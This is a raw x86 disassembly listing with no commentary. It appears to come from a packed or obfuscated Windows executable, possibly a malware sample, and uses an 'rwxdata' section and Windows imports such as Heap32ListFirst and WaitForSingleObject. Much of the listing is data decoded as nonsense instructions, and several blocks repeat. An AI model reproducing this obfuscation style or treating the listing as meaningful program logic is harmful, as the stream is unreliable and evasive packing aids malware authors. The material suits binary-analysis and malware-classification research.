imul esi [ ebx + 0x73 ] 0x65636170
add [ 0x7f ] bh
push ecx
pushfd
call sub_4d11bc
add [ eax ] al
pop edi
popad
insb
insb
imul esi [ fs : esi ] 0x52c3980f
mov bl 0x2
push 0xe370dce6
push eax
jmp rwxdata
mov [ 0xfffffffff274f6d5 ] al
sub bh [ cs : edi ]
jle rwxdata
add [ eax ] al
add ah ah
inc ebp
xor al [ fs : ebx + 0x3f ]
add [ edx ] al
add [ eax ] al
loopne rwxdata
pushad
pushf
pop [ esp + 0x1e ]
pushfd
not dl
rcl dl cl
mov dl [ esi ]
jmp rwxdata
call sub_5160c0
fdivr [ eax - 0x29 ]
pop ebp
0x2c6efc40 0xba31
mov al ch
mov al cl
lodsb [ esi ]
not bl
cmc
not al
jmp rwxdata
pushfd
pushfd
stc
sub ecx ecx
jmp rwxdata
pushad
jmp rwxdata
inc ecx
and esi ebp
je rwxdata
and al 0x45
shl [ edi - 0x64 ] 0x3c
bound edi [ eax + edx * 4 + 0xe ]
out dx eax
xchg [ esi ] ch
lea ecx [ edx ]
mov eax [ 0xffffffffff43e6e3 ]
mov esp 0x4ece65cb
shl [ edx - 0xd ] cl
jb rwxdata
inc ecx
push [ esp + 0x8 ]
pushfd
mov al 0x10
pushfd
jmp rwxdata
inc edx
sahf
imul [ ebp + 0x1d88a34f ]
nop
jo rwxdata
push cs
je rwxdata
or [ eax ] al
add [ eax ] al
in al 0x45
mov edi ebx
nop
stc
inc ebx
aas
test [ ebx ] 0x0
add [ eax + 0x38f2d8fc ] ah
pop ecx
aas
or al 0x0
add [ eax ] al
add dl ch
pop esi
stc
enter 0x5926 0x3f
or al 0x0
add [ eax ] al
inc eax
lds edi [ edx - 0x7 ]
cmp [ ebx + 0x3c3f52 ] al
add [ eax ] al
xor [ edx - 0x6 ] dl
cld
les eax [ ebx + 0x1483f52 ]
add [ eax ] al
not dl
mov [ esp ] 0x7
ror dl 0x2
pushfd
push 0xe79e7e8c
dec dl
bt sp bx
clc
push [ esp + 0x8 ]
ror dl 0x6
std
bt ax bx
cmc
push [ esp + 0x2e ]
popf
pushfd
mov [ esp ] 0x3f
inc esi
jmp rwxdata
ror al 0x2
call sub_515d7b
add [ eax ] al
pop edi
imul ebp [ edi + 0x62 ] 0x7ae96000
lea esp [ esp + 0x8 ]
pushfd
dec ecx
call sub_4baa7e
add [ eax ] al
pop edi
popad
jne rwxdata

test al 0xf7
scasb [ edi ]
retn 0xc088
mov [ esp + 0x4 ] ch
pushad
pop ecx
aas
or al 0x0
add [ eax ] al
shr dl 0x34
clc
pushfd
cli
push ebp
lahf
adc ecx ebx
into
pop edx
test [ edi + 0x4086c7ea ] eax
js rwxdata
adc dl dl
mov [ esp ] bl
pushfd
push esp
pushfd
push [ esp + 0x40 ]
retn 0x44
pushad
lea esp [ esp + 0x20 ]
jae rwxdata
sub bl [ edx ]
lea ecx [ ebx - 0x74fd2acb ]
rcr [ cs : ebx + 0x1a ] cl
pop eax
rwxdata
insb
jae rwxdata
int3
outsb
inc esp
jae rwxdata
jb rwxdata
sub bh [ edi ]
rol [ ecx ] 0x15
call sub_514f1a
add [ eax ] al
push esi
imul esi [ edx + 0x74 ] 0x466c6175
jb rwxdata
pushad
lea esp [ esp + 0x20 ]
call sub_516816
push 0x2f36ccdf
push ebx
sub ecx ebx
push [ esp ]
call sub_4ba562
pushfd
call sub_514bca
add [ eax ] al
push edx
jo rwxdata
arpl [ ebp + 0x70 ] bp
add [ eax ] al
add [ ebx + 0x74 ] dh
jb rwxdata
js rwxdata
jb rwxdata
0xda80
je rwxdata
add al 0xae
jb rwxdata
and al 0x40
je rwxdata
lahf
retn
inc ebx
or cl [ ebx - 0x52 ]
call sub_5149a7
push 0x2ac01081
call sub_518563
or [ ecx + 0x3a ] esp
jo rwxdata
lea eax [ 0x0 ]
mov [ esp ] 0x35
mov [ esp + 0x3c ] rwxdata
jmp rwxdata
pop [ esp + 0x1c ]
pushad
push [ esp ]
jmp rwxdata
clc
inc ebp
jbe rwxdata
jmp rwxdata
and al 0x40
add [ eax - 0x2 ] ah
enter 0x9f0f 0xc3
pushad
ror bl cl
mov [ esp + 0x8 ] 0x24
ror al 0x6
pushfd
push 0x3db5ced4
stosb [ edi ]
mov bl ch
mov bl 0x2
lea esp [ esp + 0x4c ]
scasb [ edi ]
add [ ebp + 0x7c019132 ] bl
sub edi edi
add al ch
or [ ebp + 0x534d0005 ] ebp
push esi
push 0x21193420
call sub_4ba009
add [ eax ] al
inc ebx
jb rwxdata
xchg [ eax - 0x64 ] bl
and [ esi - 0x39 ] ah
inc esp
and al 0x4
scasb [ edi ]
outsb
je rwxdata
mov al [ 0xffffffffae5c8487 ]
dec ebp
jbe rwxdata
sub [ ebp - 0x282051e4 ] bh
in al dx
xchg edx eax
add [ ebx - 0x5afb46d0 ] ch
jo rwxdata
cdq
xlat
movsb [ edi ] [ esi ]
neg [ ecx - 0x279cc9c7 ]
add [ eax ] al
ja rwxdata
add al ch
out dx al
mov dl 0xfb
jmp [ esi - 0x39 ]
jmp rwxdata
mov bl 0x2
push 0xbc73fcd6
push 0xb25f2b2b
inc al
inc ecx
jmp rwxdata
outsb
je rwxdata
outsb
inc esp
arpl [ gs : edx + 0x79 ] si
jo rwxdata
je rwxdata
jae rwxdata
pushad
jmp rwxdata
stosd [ edi ]
xor [ ecx + 0x32f1a504 ] bh
int1
xor ah [ eax - 0x51a37b79 ]
add al 0xa5
add [ eax ] al
add [ edi + 0x65 ] al
je rwxdata
je rwxdata
popad
jo rwxdata
je rwxdata
mov al 0x10
call sub_515d53
add [ eax ] al
jae rwxdata
inc ebx
push edx
push esp
insb
imul ebp [ esi + 0x64 ] 0x4473776f
imul esi [ edx + 0x65 ] 0x726f7463
jns rwxdata
mov ah 0x5a
0xaf298232 0x972a
into
sub ebx esi
0xa7d209b5 0x53f4
jb rwxdata
add [ eax ] al
add [ edi + 0x65 ] al
pop edi
je rwxdata
out 0x42 al
in eax 0x54
test [ ebx ] eax
js rwxdata
add [ eax ] al
add [ ebx + 0x70 ] dh
jb rwxdata
out dx al
adc [ eax ] eax
add [ edi - 0x77 ] dl
iretd
jb rwxdata
lodsd [ esi ]
add eax 0x56534d00
add [ eax ] al
add [ edi + 0x65 ] al
je rwxdata
mov esp 0x830d700a
and cl ch
jmp rwxdata
imul ebp [ edi + 0x6e ] r-xdata
add [ eax ] al
jo rwxdata
scasd [ edi ]
sub dl [ edi - 0x150cd632 ]
mov ch 0x9
shl [ edi + 0x482053f4 ] cl
xor eax 0xc663e665
jpo rwxdata
inc ebx
add [ ebp + 0x5 ] cl
add dh al
add al 0x24
xor eax 0x3c2444c7
xor ch [ eax + 0x51 ]
add cl ch
inc edi
pop esp
cli
dec [ ebx - 0x14 ]
inc edi
0x859c
add [ eax ] al
jo rwxdata
jae rwxdata
test ecx ecx
rcl [ 0x2b41ffdc ] cl
cmp eax 0xf8ddff8a
mov ebp 0x64e42207
0xd9ba
hlt
outsb
je rwxdata
pop ds
add [ eax ] al
pushad
lea esp [ esp + 0x24 ]
jne rwxdata
jo rwxdata
insb
add [ eax ] al
add [ ebx + 0x65 ] dl
je rwxdata
insb
jbe rwxdata
je rwxdata
jpe rwxdata
je rwxdata
add [ ecx ] edi
add [ esi + 0x70 ] ah
jne rwxdata
add cl dl
push edi
shr [ eax - 0x31 ] 0x40
jb rwxdata
push [ ebp - 0x8 ]
add [ eax - 0x77 ] ah
inc esp
and al 0x20
mov [ esp + 0x4 ] 0x86ae
pop eax
pushfd
call sub_515ff7
lea edi [ ecx + 0x791c83a5 ]
and al 0x4
add [ eax ] al
add [ esi + 0x69 ] dl
jb rwxdata
jae rwxdata
arpl [ ebp + 0x43 ] sp
popad
jo rwxdata
call sub_514aff
jmp rwxdata
add al 0x51
add [ edi + 0x18 ] eax
imul esi [ 0x24648db4 ] 0x8
inc ecx
xor [ ebx - 0x50c87ee4 ] eax
sub ch cl
mov esp 0xbcaf27cd
or cl al
cdq
popfd
sbb ch bl
xchg edi eax
je rwxdata
arpl [ eax ] ax
add [ eax ] al
inc edi
je rwxdata
je rwxdata
jns rwxdata
jne rwxdata
outsd
pushfd
adc [ edx ] esi
xchg esi eax
imul edx ecx 0xa7c254e0
in al 0xcf
je rwxdata
xchg ecx eax
add [ ecx + ebp - 0x1 ] edi
add [ eax ] al
add [ esi + 0x66 ] ah
insb
jne rwxdata
setae [ 0xffffffffa81b6c87 ]
test [ ecx ] edi
fmul [ ecx - 0x7ed456cd ]
sahf
push ss
scasd [ edi ]
shr esp 0x1
das
sahf
add eax 0x63fb557b
cwde
and al 0xa9
sub [ ebx - 0x78b248b7 ] 0x4409
cmp eax 0x7fb6fd05
popad
add al 0x78
outsd
insb
jne rwxdata
sbb ch [ ecx ]
pslld mm7 [ esi ]
add eax 0x3776657f
test al 0x87
inc ecx
inc eax
push ss
ja rwxdata
je rwxdata
test [ edi ] ebx
insb
push eax
jb rwxdata
aam 0x91
hlt
aad 0x4d
lea esp [ esp + 0x38 ]
call sub_514aff
pushad
adc al al
call sub_4ba21b
add [ eax ] al
dec edi
jo rwxdata
push 0x246c8800
add al 0x60
push eax
sbb cl [ esi - 0x29 ]
sahf
cwde
shr [ ebp + 0x32 ] 0x2c
imul edx [ esi - 0x80 ] 0xffffffd7
or [ ebx ] eax
jne rwxdata
dec esp
cmp ecx [ edx + 0x20 ]
imul eax [ ecx + edx * 2 ] 0x1
inc edi
sbb [ ebx + 0x35 ] ch
mov ah 0x8d
and al 0x8
inc ecx
add [ ebx - 0x21 ] dl
jne rwxdata
insd
add cl ch
mov dh 0x19
add esp eax
push esi
std
jle rwxdata
add [ eax ] al
insd
push esp
imul ebp [ ebp + 0x65 ] 0x19b6e900
mov edi [ esp + 0x8 ]
call sub_5160ed
add [ eax ] al
inc edi
je rwxdata
mov ecx 0x791c83a5
je rwxdata
jb rwxdata
jbe rwxdata
cmp edi [ ecx - 0x6278c946 ]
je rwxdata
retn 0xd248
push edi
mov edi ecx
mov ebx [ esp + 0x4 ]
arpl [ eax + eax + 0x66 ] si
adc esi edx
btc ax 0x1
aaa
mov esi edi
add ah 0xd5
shld eax ebx 0x15
mov eax [ edx + 0xc ]
call sub_4ba26d
jmp rwxdata
popad
insd
inc ecx
add [ eax + 0x72 ] ch
sbb al 0x13
ja rwxdata
dec eax
pop edi
pop edi
je rwxdata
adc eax 0x4d9c0a5a
in eax dx
std
dec eax
popad
jae rwxdata
sbb al 0xfb
adc [ eax ] eax
xor [ ecx + edx ] bl
cmc
test al 0xb
add [ ecx - 0x60 ] dh
or eax [ eax ]
sub [ ebp + 0x5caf000b ] esp
adc [ eax ] eax
test [ edi + 0x11 ] dh
add bh ch
pop esp
adc [ eax ] eax
outsb
dec esi
adc [ eax ] eax
aam 0xa6
or eax [ eax ]
mov [ ecx + edx ] ch
in al dx
push esp
adc [ eax ] eax
mov [ esi + 0x46b6000b ] fs
adc [ eax ] eax
out dx eax
mov [ 0x6304000b ] eax
adc [ eax ] eax
inc edi
mov al [ 0xffffffffa40d000b ]
or eax [ eax ]
mov eax 0x3e001164
push 0xab0e0011
or eax [ eax ]
and eax 0x5a00115e
jl Heap32ListFirst@IAT
popad
imul ebp [ esi + 0x61 ] 0x736772
push 0x1ac010d0
call sub_518ef7
cmp al 0x30
std
0xfdc0953a 0x7610
add [ eax ] al
add [ edi + 0x65 ] al
je rwxdata
cli
arpl [ ecx ] dx
add [ ebp + 0x64 ] cl
adc [ eax ] eax
popad
mov al [ 0x6435000b ]
adc [ eax ] eax
cmp ebp [ esi + 0x11 ]
add [ ecx + edi * 2 + 0x560b0011 ] dh
adc [ eax ] eax
das
jge GetSystemTime@IAT
add [ ecx + 0x56 ] al
adc [ eax ] eax
pop edi
adc [ eax ] ax
and [ edx + 0x6b06000b ] 0x11
add dl bh
xor ah [ esi - 0x5a ]
int3
jae rwxdata
pop ds
dec esi
adc [ eax ] eax
mov eax [ 0x6b000ba6 ]
mov [ 0xfffffffffed3000b ] eax
or al 0x0
xlat
mov [ 0x11ee000b ] eax
or eax 0x11662600
add bh al
pop ecx
adc [ eax ] eax
adc al 0x5a
adc [ eax ] eax
lds esp [ eax + 0x11 ]
add [ ebx - 0x2affeeac ] bh
pushad
adc [ eax ] eax
dec esi
ror [ eax + eax ] 0x1
push cs
stosb [ edi ]
or eax [ eax ]
cmp [ ebx + 0x75f2000b ] ebp
adc [ eax ] eax
add al 0x7d
adc [ eax ] eax
aas
mov [ 0x7759000b ] al
adc [ eax ] eax
mov eax 0x85000ba6
into
add [ esp ] cl
adc [ eax ] eax
jg rwxdata
jbe rwxdata
jb rwxdata
add [ ecx + 0x11 ] ebx
add [ edx ] ch
dec [ eax + eax ]
add [ eax + 0x29001153 ] ah
push esp
adc [ eax ] eax
pop edx
test eax 0x5933000b
adc [ eax ] eax
js WaitForSingleObject@IAT
add [ ebp - 0x28fff332 ] al
adc [ eax ] eax
lodsd [ esi ]
movsd [ edi ] [ esi ]
or eax [ eax ]
je CreateEventA@IAT
je __import_name_6(MSVCRT:__getmainargs)
mov ecx 0x9d8736ba
push esp
add [ eax ] dl
inc ebx
or al 0x0
xlat
or eax [ eax ]
hlt
cmp [ esi + 0x11 ] edx
add cl al
adc [ 0x115c3e00 ] ecx
add [ edx - 0x2f ] al
or al 0x0
aaa
test al 0xb
add [ edx + 0x5a ] dh
adc [ eax ] eax
cmp dh [ ecx + 0x11 ]
add [ eax ] al
add [ eax ] al
add ch cl
arpl [ ecx ] dx
add [ eax + 0x76001177 ] ch
dec esp
adc [ eax ] eax
pop ecx
adc [ eax ] eax
mov [ esi + 0x11 ] gs
add [ ebx + ecx * 2 ] al
adc [ eax ] eax
jg rwxdata
xor ebx [ ecx + 0x11 ]
add [ ecx ] al
pop ecx
adc [ eax ] eax
sub bh bh
or al 0x0
adc [ eax ] eax
sub_5149a7
pushfd
lea esp [ esp + 0x8 ]
call sub_514aff
call sub_515979
not bl
not cx
push esi
pushfd
mov ebx [ esp + 0x8 ]
mov [ esp + 0x4 ] bh
setns cl
mov ecx [ esp + 0xc ]
pushfd
call j_sub_4cfe36
sub_5149d2
pushfd
lodsb [ esi ]
bt ax 0xd
call sub_4cce9f
xor [ edi + 0x473d8407 ] dl
shl [ ebx + 0xd ] 0xfc
add eax [ ecx + 0x53 ]
cmp ch 0xae
pop esi
cmp cl [ edi - 0x7f ]
outsd
pushad
add [ eax + 0x2b ] edi
and al [ eax - 0x49d659c2 ]
out dx eax
ficom [ edi + 0x74 ]
and edi ebp
add ebx esp
fistp [ eax - 0x5d ]
dec esi
pop ebp
or [ ebx ] ecx
fsub [ esi + ebp ]
adc edi [ edx - 0x4f ]
sbb ch [ esi + 0x5a ]
das
scasd [ edi ]
jecxz rwxdata
inc ecx
pushfd
dec bl
inc bl
mov bl 0xda
inc ecx
stc
not bl
clc
sbb bl dh
xchg ebp eax
setle al
mov eax ebp
cmp dl 0x6a
not bl
not bl
mov bl 0x1
test ch dl
xchg [ esp + 0x4 ] esi
not si
mov bl 0x1c
shr [ esi ] cl
clc
popad
adc [ eax ] ah
push esi
enter 0x710c 0xf3
sbb ecx ebp
push esp
sub [ esi ] edx
0xf0b4c55c 0xa319
js rwxdata
[ edi ] [ esi ]
pushfd
pushad
mov esi [ esp + 0x2c ]
push ebx
mov [ esp ] dh
push [ esp + 0x4 ]
lea esp [ esp + 0x38 ]
jmp rwxdata
shl [ ebx - 0x782a7bff ] cl
je rwxdata
dec ecx
or ecx [ esi ]
xor cl [ edi + 0x71 ]
mov edi gs
shr [ es : eax - 0x3 ] 0x1
outsd
fimul [ ebp + edi + 0x4239684f ]
movsb [ edi ] [ esi ]
jecxz rwxdata
pushad
pushfd
lea esp [ esp + 0x24 ]
call sub_514aff
pushfd
push [ esp ]
lea esp [ esp + 0x8 ]
jae rwxdata
or al [ eax ]
add [ eax ] al
add [ edx + 0x65 ] dl
popad
insb
imul edi [ edx + 0x65 ] 0x656c6150
je rwxdata
cmp al 0x13
and esi 0x7ec78d0b
mov esi edi
cmp bl 0x5f
sub esi eax
pushfd
jmp rwxdata
add al 0x66
not esi
sub ebx [ ebp - 0x65e24b04 ]
cmpsd [ esi ] [ edi ]
push edi
aam 0x95
dec ebp
adc [ ebp + 0x43176504 ] dh
or al 0x83
fmul [ ebx - 0x68205140 ]
clc
jae rwxdata
mov al ch
mov al cl
lodsb [ esi ]
not bl
cmc
not al
jmp rwxdata
pushfd
pushfd
stc
sub ecx ecx
jmp rwxdata
add al ch
out dx al
mov dl 0xfb
add [ gs : eax ] al
add [ edi + 0x5f ] bl
jae rwxdata
add [ edi + 0x77 ] bl
outsw
jo rwxdata
ror al 0x2
call sub_515d7b
add [ eax ] al
pop edi
imul ebp [ edi + 0x62 ] 0x7ae96000
lea esp [ esp + 0x8 ]
je rwxdata
je rwxdata
push eax
popad
insb
je rwxdata
outsb
add [ eax ] al
add [ edi + 0x76 ] bl
jae rwxdata
pushad
lea esp [ esp + 0x20 ]
jae rwxdata
neg [ ecx - 0x66095b29 ]
cmp [ esi ] esi
arpl ax bx
jbe rwxdata
dec esi
jae rwxdata
jb rwxdata
jo rwxdata
pushad
lea esp [ esp + 0x20 ]
call sub_516816
push 0x2f36ccdf
push ebx
sub ecx ebx
push [ esp ]
call sub_514f1a
add [ eax ] al
push esi
imul esi [ edx + 0x74 ] 0x466c6175
jb rwxdata
call sub_4ba562
pushfd
call sub_514bca
add [ eax ] al
je rwxdata
jae rwxdata
and [ esi - 0x39 ] ah
inc esp
and al 0x4
scasb [ edi ]
outsb
je rwxdata
jmp rwxdata
pushfd
push [ esp ]
push 0x42e22958
lea esp [ esp + 0xc ]
jne rwxdata
jb rwxdata
lea esp [ esp + 0x4 ]
mov [ esp ] 0xd2004e50
popad
je rwxdata
jb rwxdata
imul ebp [ esi + 0x74 ] 0x990f0066
retn
add [ eax ] al
add al al
add [ edx + esi * 8 + 0x14 ] esp
pop ecx
aas
or al 0x0
add [ eax ] al
inc eax
scasb [ edi ]
mov cl dh
loopne rwxdata
inc ebp
js rwxdata
xchg [ eax - 0x64 ] bl
add al 0xae
jb rwxdata
je rwxdata
popad
jo rwxdata
je rwxdata
lea eax [ 0x0 ]
mov [ esp ] 0x35
mov [ esp + 0x3c ] rwxdata
jmp rwxdata
add [ eax ] al
ja rwxdata
cdq
xlat
movsb [ edi ] [ esi ]
neg [ ecx - 0x279cc9c7 ]
pushfd
pushad
lea esp [ esp + 0x24 ]
jne rwxdata
pushfd
push [ esp + 0x4 ]
retn 0x8
jmp rwxdata
jmp [ esi - 0x39 ]
js rwxdata
add [ eax ] al
add [ ebp + 0x78 ] al
imul esi [ edi + edx * 2 + 0x69 ] 0x776f646e
jae __import_name_3(ADVAPI32:ReportEventA)
sub al 0x4
add [ eax ] al
loopne rwxdata
pop ecx
aas
or al 0x0
add [ eax ] al
add dh al
or esi ebx
adc [ fs : edx + 0x3f ] 0x58
add [ eax ] eax
add [ eax + 0xc ] dl
mov edi edx
sub al 0x26
pop ecx
aas
or al 0x0
add [ eax ] al
add [ edi + 0x2264fcdc ] ah
pop ecx
aas
clc
push eax
push [ esp + 0x4 ]
xchg [ esp + 0x8 ] ebp
sub bp dx
shl ebp cl
lea ebp [ esp + 0x8 ]
stc
push [ esp ]
bt esi 0x2
cmp esp ecx
mov [ esp + 0x8 ] ecx
mov [ esp + 0x4 ] 0x6b
mov [ esp + 0x4 ] ebx
cmc
bt dx 0x1
or eax eax
call sub_4d126d
lodsb [ esi ]
pushfd
not al
clc
jmp rwxdata
pop [ esp + 0x1c ]
pushad
push [ esp ]
jmp rwxdata
clc
inc ebp
mov ah 0x5a
0xaf298232 0x972a
into
sub ebx esi
0xa7d209b5 0x53f4
jb rwxdata
add [ eax ] al
add [ edi + 0x65 ] al
pop edi
je rwxdata
out 0x42 al
in eax 0x54
test [ ebx ] eax
js rwxdata
add [ eax ] al
add [ ebx + 0x70 ] dh
jb rwxdata
push 0x21193420
call sub_4ba009
add [ eax ] al
inc ebx
jb rwxdata
pushad
pushf
pop [ esp + 0x1e ]
pushfd
not dl
rcl dl cl
mov dl [ esi ]
jmp rwxdata
call sub_5160c0
fdivr [ eax - 0x29 ]
pop ebp
0x2c6efc40 0xba31
push edx
jo rwxdata
js sub_514aff
inc ebx
aas
out 0x0 eax
add [ eax ] al
jmp rwxdata
salc
clc
hlt
cmc
mov [ esp ] 0x4a54
ror al 0x2
mov [ esp + 0x4 ] bh
dec al
jmp rwxdata
mov esp 0x830d700a
and cl ch
jmp rwxdata
imul ebp [ edi + 0x6e ] r-xdata
add [ eax ] al
jo rwxdata
scasd [ edi ]
sub dl [ edi - 0x150cd632 ]
mov ch 0x9
shl [ edi + 0x482053f4 ] cl
xor eax 0xc663e665
jpo rwxdata
inc ebx
add [ ebp + 0x5 ] cl
add dh al
add al 0x24
xor eax 0x3c2444c7
xor ch [ eax + 0x51 ]
add cl ch
inc edi
pop esp
cli
dec [ ebx - 0x14 ]
inc edi
0x859c
add [ eax ] al
jo rwxdata
jae rwxdata
test ecx ecx
rcl [ 0x2b41ffdc ] cl
cmp eax 0xf8ddff8a
mov ebp 0x64e42207
0xd9ba
hlt
outsb
je rwxdata
add [ ebx - 0x5afb46d0 ] ch
jo rwxdata
not dl
mov [ esp ] 0x7
ror dl 0x2
pushfd
push 0xe79e7e8c
dec dl
bt sp bx
clc
push [ esp + 0x8 ]
ror dl 0x6
std
bt ax bx
cmc
push [ esp + 0x2e ]
popf
pushfd
mov [ esp ] 0x3f
inc esi
jmp rwxdata
jbe rwxdata
cmc
cmc
stc
ror al 0x6
lea esp [ esp + 0x2c ]
jne rwxdata
je rwxdata
jpe rwxdata
je rwxdata
add [ ecx ] edi
add [ esi + 0x70 ] ah
jne rwxdata
add cl dl
push edi
shr [ eax - 0x31 ] 0x40
jb rwxdata
push [ ebp - 0x8 ]
add [ eax - 0x77 ] ah
inc esp
and al 0x20
mov [ esp + 0x4 ] 0x86ae
pop eax
pushfd
jmp rwxdata
outsb
inc esp
arpl [ gs : edx + 0x79 ] si
jo rwxdata
adc dl dl
mov [ esp ] bl
pushfd
push esp
pushfd
push [ esp + 0x40 ]
retn 0x44
add [ eax ] cl
xor eax 0x7d9bf9ac
lodsd [ esi ]
shl al 0x7c
in al dx
je rwxdata
pop esi
aas
or [ esp + eax ] 0x7
dec ebx
out 0xf2 eax
mov bl 0xf3
inc ebx
aas
cmp eax 0x90000008
pop ss
sub al 0xf1
loopne rwxdata
add dl dl
call sub_4cfe42
mov [ esp ] 0x4e50
call j_sub_51680a
pushfd
mov [ esp ] 0xc4ad
cmp eax 0x7d00
pushfd
pushad
lea esp [ esp + 0x28 ]
jae rwxdata
call sub_514aff
jmp rwxdata
add al 0x51
add [ edi + 0x18 ] eax
imul esi [ 0x24648db4 ] 0x8
inc ecx
xor [ ebx - 0x50c87ee4 ] eax
sub ch cl
mov esp 0xbcaf27cd
or cl al
cdq
popfd
sbb ch bl
xchg edi eax
je rwxdata
arpl [ eax ] ax
add [ eax ] al
inc edi
je rwxdata
sub [ ebp - 0x282051e4 ] bh
in al dx
xchg edx eax
stosd [ edi ]
xor [ ecx + 0x32f1a504 ] bh
int1
xor ah [ eax - 0x51a37b79 ]
add al 0xa5
add [ eax ] al
add [ edi + 0x65 ] al
je rwxdata
mov es sp
pop ss
add eax 0x830ad99d
xchg edi eax
cwde
mov al 0x26
pop ecx
aas
or al 0x0
add [ eax ] al
inc eax
inc ecx
idiv ch
leave
inc ebx
aas
jmp rwxdata
stc
pushfd
call sub_4cd0f5
setae [ 0xffffffffa81b6c87 ]
test [ ecx ] edi
fmul [ ecx - 0x7ed456cd ]
sahf
push ss
scasd [ edi ]
shr esp 0x1
inc ebx
push edx
push esp
insb
imul ebp [ esi + 0x64 ] 0x4473776f
imul esi [ edx + 0x65 ] 0x726f7463
jns rwxdata
xor al 0xfd
movsd [ edi ] [ esi ]
dec esi
push edi
div [ 0x69d36210 ]
fsubr [ ebp - 0x5809edc ]
mov ecx 0xa2c3bbf9
enter 0x5d3f 0x2f
test edx 0xeb93f012
mov ch 0x27
push 0xffffffda
add [ eax ] al
imul esi [ ebx + 0x73 ] 0x65636170
add [ 0x7f ] bh
push ecx
pushfd
call sub_4d11bc
add [ eax ] al
pop edi
popad
insb
insb
imul esi [ fs : esi ] 0x52c3980f
mov bl 0x2
push 0xe370dce6
push eax
jmp rwxdata
mov [ 0xfffffffff274f6d5 ] al
sub bh [ cs : edi ]
jle rwxdata
add [ eax ] al
add ah ah
inc ebp
xor al [ fs : ebx + 0x3f ]
add [ edx ] al
add [ eax ] al
loopne rwxdata
mov bl 0x4a
setb bl
mov bl al
inc ecx
push esi
dec bl
pushfd
inc ecx
add esp 0x8
not bl
test dh 0x55
xchg ebp eax
daa
clc
mov eax ebp
pushad
add bl ah
mov bl 0x1
sub esp 0xffffffe0
push eax
sbb cl [ esi - 0x29 ]
sahf
cwde
shr [ ebp + 0x32 ] 0x2c
imul edx [ esi - 0x80 ] 0xffffffd7
or [ ebx ] eax
jne rwxdata
dec esp
cmp ecx [ edx + 0x20 ]
imul eax [ ecx + edx * 2 ] 0x1
inc edi
sbb [ ebx + 0x35 ] ch
mov ah 0x8d
and al 0x8
int3
jbe rwxdata
lodsd [ esi ]
add eax 0x56534d00
add [ eax ] al
add [ edi + 0x65 ] al
je rwxdata
inc ecx
push [ esp + 0x8 ]
pushfd
mov al 0x10
pushfd
jmp rwxdata
inc edx
sahf
imul [ ebp + 0x1d88a34f ]
nop
jo rwxdata
push cs
je rwxdata
or [ eax ] al
add [ eax ] al
in al 0x45
mov edi ebx
nop
stc
inc ebx
aas
test [ ebx ] 0x0
add [ eax + 0x38f2d8fc ] ah
pop ecx
aas
or al 0x0
add [ eax ] al
add dl ch
pop esi
stc
enter 0x5926 0x3f
or al 0x0
add [ eax ] al
inc eax
lds edi [ edx - 0x7 ]
cmp [ ebx + 0x3c3f52 ] al
add [ eax ] al
xor [ edx - 0x6 ] dl
cld
les eax [ ebx + 0x1483f52 ]
add [ eax ] al
cmp di 0xba02
cmp si sp
push esi
ror si cl
pushad
mov esi edi
call sub_51578e
add [ eax ] al
dec esi
je rwxdata
push 0xf9efd1ed
mov [ esp ] bp
pushad
mov [ esp + 0x20 ] esi
shr esi cl
lea esi [ eax * 2 - 0x2888c866 ]
mov esi edi
push [ esp ]
call sub_515aa3
mov bl 0x2
push 0xbc73fcd6
push 0xb25f2b2b
inc al
inc ecx
jmp rwxdata
je rwxdata
outsb
insb
add [ eax ] al
add [ ebx + 0x65 ] dl
je rwxdata
insb
jbe rwxdata
mov [ esp + 0x4 ] ch
pushad
pop ecx
aas
or al 0x0
add [ eax ] al
shr dl 0x34
clc
pushfd
cli
push ebp
lahf
adc ecx ebx
into
pop edx
test [ edi + 0x4086c7ea ] eax
js rwxdata
mov ebx [ esi ]
bt esp 0x10
clc
stc
clc
and ebx 0xfff
cmp ah 0x4e
pushfd
stc
clc
add [ edi + ebx ] edx
sub esp 0xfffffff8
cmp dh ah
bt ax ax
add esi 0x2
jmp rwxdata
imul ebp [ edi + 0x73 ] 0x5ce06100
cmc
fidiv [ ebp - 0x3914778 ]
pop esp
pushad
jmp rwxdata
jae rwxdata
arpl [ ebp + 0x43 ] sp
popad
jo rwxdata
outsb
inc esp
jae rwxdata
jb rwxdata
sub bh [ edi ]
rol [ ecx ] 0x15
pushad
jmp rwxdata
inc ecx
and esi ebp
je rwxdata
and al 0x45
shl [ edi - 0x64 ] 0x3c
bound edi [ eax + edx * 4 + 0xe ]
out dx eax
xchg [ esi ] ch
lea ecx [ edx ]
mov eax [ 0xffffffffff43e6e3 ]
mov esp 0x4ece65cb
shl [ edx - 0xd ] cl
jb rwxdata
mov al 0x10
call sub_515d53
add [ eax ] al
jae rwxdata
outsd
pushfd
adc [ edx ] esi
xchg esi eax
imul edx ecx 0xa7c254e0
in al 0xcf
je rwxdata
xchg ecx eax
add [ ecx + ebp - 0x1 ] edi
add [ eax ] al
add [ esi + 0x66 ] ah
insb
jne rwxdata
0xda80
je rwxdata
pushfd
dec ecx
call sub_4baa7e
add [ eax ] al
pop edi
popad
jne rwxdata

test al 0xf7
scasb [ edi ]
retn 0xc088
out dx al
adc [ eax ] eax
add [ edi - 0x77 ] dl
iretd
jb rwxdata
scasb [ edi ]
add [ ebp + 0x7c019132 ] bl
sub edi edi
add al ch
or [ ebp + 0x534d0005 ] ebp
push esi
mov al [ 0xffffffffae5c8487 ]
dec ebp
aam 0x91
hlt
aad 0x4d
lea esp [ esp + 0x38 ]
call sub_514aff
pushad
adc al al
call sub_4ba21b
add [ eax ] al
dec edi
jo rwxdata
push 0x246c8800
add al 0x60
or [ ecx + 0x3a ] esp
jo rwxdata
sub bl [ edx ]
lea ecx [ ebx - 0x74fd2acb ]
rcr [ cs : ebx + 0x1a ] cl
pop eax
rwxdata
insb
jae rwxdata
pop ds
add [ eax ] al
pushad
lea esp [ esp + 0x24 ]
jne rwxdata
jo rwxdata
arpl [ ebp + 0x70 ] bp
add [ eax ] al
add [ ebx + 0x74 ] dh
jb rwxdata
js rwxdata
jb rwxdata
jpe rwxdata
call sub_515ff7
lea edi [ ecx + 0x791c83a5 ]
and al 0x4
add [ eax ] al
add [ esi + 0x69 ] dl
jb rwxdata
and al 0x40
je rwxdata
lahf
retn
inc ebx
or cl [ ebx - 0x52 ]
call sub_5149a7
push 0x2ac01081
call sub_518563
je rwxdata
jns rwxdata
jne rwxdata
jmp rwxdata
and al 0x40
add [ eax - 0x2 ] ah
enter 0x9f0f 0xc3
pushad
ror bl cl
mov [ esp + 0x8 ] 0x24
ror al 0x6
pushfd
push 0x3db5ced4
stosb [ edi ]
mov bl ch
mov bl 0x2
